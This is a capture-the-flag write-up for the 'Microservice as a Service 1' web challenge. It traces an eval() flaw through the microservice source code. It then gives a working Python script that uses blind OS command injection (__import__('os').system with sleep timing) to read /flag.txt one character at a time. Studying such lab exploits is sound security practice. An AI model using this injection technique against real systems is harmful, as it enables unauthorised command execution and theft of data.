---
grand_parent: Categories
parent: Web
title: Microservice as a Service 1
nav_order: 1
---

# Microservice as a Service 1

```
Part 1: Calculator

https://maas.rars.win/

This is a 3 part challenge.

Note: This challenge restarts periodically, if you get 502 errors, you may have caught it during a restart, it should be up within a minute.
```

## Challenge

> TL;DR: Blind OS Command Injection so we infer the flag character by character via `sleep`-ing.

As this is a three-part challenge, it would be good to take a look at their docker-compose file to see the network layout.

```yml
version: "3.3"
services:
  app:
    build: app
    ports:
      - "5000:5000"
    depends_on: ["calculator", "notes", "manager"]
    networks:
      - public
      - level-1

  calculator:
    build: calculator
    depends_on: ["checkers", "arithmetic"]
    networks:
      - level-1
      - calculator-net
  checkers:
    build: calculator/checkers
    networks:
      - calculator-net
  arithmetic:
    build: calculator/arithmetic
    networks:
      - calculator-net

  notes:
    build: notes
    depends_on: ["redis_users", "redis_userdata"]
    networks:
      - level-1
      - notes-net
  redis_users:
    image: library/redis:latest
    networks:
      - notes-net
  redis_userdata:
    build: notes/redis_userdata
    networks:
      - notes-net

  manager:
    build: manager
    depends_on: ["manager_users", "manager_updater"]
    networks:
      - level-1
      - manager-net
  manager_users:
    image: library/redis:latest
    networks:
      - manager-net
  manager_updater:
    build: manager/updater
    networks:
      - level-1
      - manager-net

networks:
    public:
        driver: bridge
    level-1:
        driver: bridge
        internal: true
    calculator-net:
        driver: bridge
        internal: true
    notes-net:
      driver: bridge
      internal: true
    manager-net:
      driver: bridge
      internal: true
```

It looks like the main application will be able to access the following 3 instances directly via the shared network `level-1`:
1. `calculator`
2. `notes`
3. `manager`

Looking at the network layout for this challenge, we see that there are 2 additional hosts, `checkers` and `arithmetic`, that we cannot reach from the main application directly as they reside in `calculator-net`:
```yml
  calculator:
    build: calculator
    depends_on: ["checkers", "arithmetic"]
    networks:
      - level-1
      - calculator-net
  checkers:
    build: calculator/checkers
    networks:
      - calculator-net
  arithmetic:
    build: calculator/arithmetic
    networks:
      - calculator-net
```

Now that we have a high-level overview of the challenge, let's analyse the given source code.

We adopt a top-down approach by analyzing the main `app.py` file first, and focusing on the function that route to `/calculator`. We see that the HTTP parameter `mode` would result in the main server sending a request to `calculator` on the `calculator-net` internal network.

**Source**: `app/app.py`
```py
@app.route('/calculator', methods=["POST", "GET"])
def calculator():
    if request.method == "GET":
        return render_template('calculator.html')
    mode = request.form.get('mode')
    if not mode:
        return ERR_MISSING, 422
    if mode == 'checkers':
        value = request.form.get('value')
        if not value:
            return ERR_MISSING, 422
        body = {"value": value}
        if request.form.get('even'):
            body['even'] = True
        elif request.form.get('odd'):
            body['odd'] = True
        elif request.form.get('number'):
            body['number'] = True
        else:
            return ERR_MISSING, 422
        r = requests.post('http://calculator:5000/checkers', data=body)
        return render_template('calculator.html', tab='checkers', result=r.text)
    elif mode == 'arithmetic':
        n1 = request.form.get('n1')
        n2 = request.form.get('n2')
        if not n1 or not n2:
            return ERR_MISSING, 422
        body = {"n1": n1, "n2": n2}
        if request.form.get('add'):
            body['add'] = True
        elif request.form.get('sub'):
            body['sub'] = True
        elif request.form.get('div'):
            body['div'] = True
        elif request.form.get('mul'):
            body['mul'] = True
        else:
            return ERR_MISSING, 422
        r = requests.post('http://calculator:5000/arithmetic', data=body)
        return render_template('calculator.html', tab='arithmetic', result=r.text)
```

On the `calculator` server, upon receiving a request from the main application server, it simply forwards the requests, along with the supplied parameters, to either the `checkers` or `arithmetic` host.

**Source**: `app/calculator/app.py`
```py
@app.route('/checkers', methods=["POST"])
def checkers():
    if request.form.get('even'):
        r = requests.get(f'http://checkers:3000/is_even?n={request.form.get("value")}')
    elif request.form.get('odd'):
        r = requests.get(f'http://checkers:3000/is_odd?n={request.form.get("value")}')
    elif request.form.get('number'):
        r = requests.get(f'http://checkers:3000/is_number?n={request.form.get("value")}')
    result = r.json()
    res = result.get('result')
    if not res:
        return str(result.get('error'))
    return str(res)

@app.route('/arithmetic', methods=["POST"])
def arithmetic():
    if request.form.get('add'):
        r = requests.get(f'http://arithmetic:3000/add?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('sub'):
        r = requests.get(f'http://arithmetic:3000/sub?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('div'):
        r = requests.get(f'http://arithmetic:3000/div?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('mul'):
        r = requests.get(f'http://arithmetic:3000/mul?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    result = r.json()
    res = result.get('result')
    if not res:
        return str(result.get('error'))
    try:
        res_type = type(eval(res,  builtins.__dict__, {}))
        if res_type is int or res_type is float:
            return str(res)
        else:
            return "Result is not a number"
    except NameError:
        return "Result is invalid"
```

Looking at these 2 routings, our eyes immediately spot that `/arithmetic` route contains an `eval()` function call using the value contained in "result" from the `arithmetic` server response.

Let's look at the source for the `arithmetic` server.

**Source**: `app/calculator/arithmetic/index.js`
```js
app.get('/add', (req, res) => {
    if (!(req.query.n1 && req.query.n2)) {
        res.json({"error": "No number provided"});
    }
    res.json({"result": req.query.n1 + req.query.n2});
});

app.get('/sub', (req, res) => {
    if (!(req.query.n1 && req.query.n2)) {
        res.json({"error": "No number provided"});
    }
    res.json({"result": req.query.n1 - req.query.n2});
});

app.get('/div', (req, res) => {
    if (!(req.query.n1 && req.query.n2)) {
        res.json({"error": "No number provided"});
    }
    res.json({"result": req.query.n1 / req.query.n2});
});

app.get('/mul', (req, res) => {
    if (!(req.query.n1 && req.query.n2)) {
        res.json({"error": "No number provided"});
    }
    res.json({"result": req.query.n1 * req.query.n2});
});
```

Using the variables `n1` and `n2` obtained from the HTTP request parameters, different arithmetic operations are performed depending on the endpoint and the results are returned. We see that `add` looks promising as it concatenates and returns `n1` and `n2`.

Then back at `calculator`, this response is used in an `eval()` function call:
```py
result = r.json()
res = result.get('result')
if not res:
    return str(result.get('error'))
try:
    res_type = type(eval(res,  builtins.__dict__, {}))
```

We can now inject OS commands into either `n1` or `n2` and setting the arithmetic operation to be `/add`. However, the output of the OS command is never shown to us since the `eval()` is wrapped by a `type()` function call. Furthermore, the command execution takes place on the `calculator` host, which does not have access to the `public` network, meaning we cannot simply `curl` out the flag.

Our approach would be to read the flag character by character and `sleep`-ing when the guessed character is correct. To do this, a script was created to simplify the process. We `sleep` for 5 seconds when the guess is correct.

```py
import requests

url = "https://maas.rars.win/calculator"
timeout = 5

def send_req(payload):
    data = {
        "mode": "arithmetic",
        "add": "1",
        "n2": " ",
        "n1": payload
    }
    res = requests.post(url, data=data)
    if res.elapsed.total_seconds() > timeout:
        return True
    else:
        return False

def brute_len():
    print("Flag Length: ", end="", flush=True)
    for i in range(1, 101):
        cmd = "if [ $(cat /flag.txt | wc -m) == {} ]; then sleep {}; fi".format(i, timeout)
        payload = "__import__('os').system('{}')".format(cmd)
        if send_req(payload):
            print("{}".format(i))
            return i

def brute_flag(flag_length):
    print("Flag: ", end="", flush=True)
    for i in range(1, flag_length + 1):
        for c in range(32, 127):
            cmd = "if [ $(cat /flag.txt | cut -c {}) == {} ]; then sleep {}; fi".format(i, chr(c), timeout)
            payload = "__import__('os').system('{}')".format(cmd)
            if send_req(payload):
                print("{}".format(chr(c)), end="", flush=True)
    print()

flag_length = brute_len()
brute_flag(flag_length)
```

Running the script:
```bash
$ python3 calculator.py
Flag Length: 39
Flag: rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}
```

Flag: `rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}`
